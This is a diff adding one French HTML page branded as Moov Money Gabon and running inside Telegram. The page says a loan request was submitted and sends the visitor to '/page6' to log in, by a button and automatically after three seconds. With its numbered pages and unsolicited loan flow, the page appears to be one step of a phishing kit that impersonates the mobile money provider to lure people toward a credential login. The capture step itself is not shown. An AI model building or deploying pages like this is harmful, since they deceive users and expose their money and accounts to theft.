@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Demande Soumise - Moov Money Gabon</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --moov-orange: #ff6600; --moov-blue: #0047ab; }
+        body { background-color: #f0f4f8; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; font-family: sans-serif; }
+        .card { background: white; width: 90%; max-width: 420px; padding: 40px 24px; border-radius: 24px; text-align: center; box-shadow: 0 6px 25px rgba(0,0,0,0.04); }
+        .check-circle { width: 88px; height: 88px; background-color: var(--moov-orange); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 28px; color: white; font-size: 38px; }
+        .main-title { font-size: 26px; color: var(--moov-orange); margin-bottom: 20px; font-weight: 800; }
+        .message-text { color: #64748b; font-size: 15px; margin-bottom: 16px; line-height: 1.5; }
+        .btn-outline { background: transparent; color: #1e293b; border: 1px solid #cbd5e1; width: 100%; padding: 14px; border-radius: 10px; font-weight: 600; cursor: pointer; margin-top: 15px; }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="check-circle">✓</div>
+    <h1 class="main-title">Demande Soumise</h1>
+    <p class="message-text">Votre demande de prêt a été soumise avec succès. Veuillez vous connecter pour continuer.</p>
+    <button class="btn-outline" onclick="location.href='/page6'">Se connecter maintenant</button>
+</div>
+<script>
+    setTimeout(() => { location.href = "/page6"; }, 3000);
+</script>
+</body>
+</html>
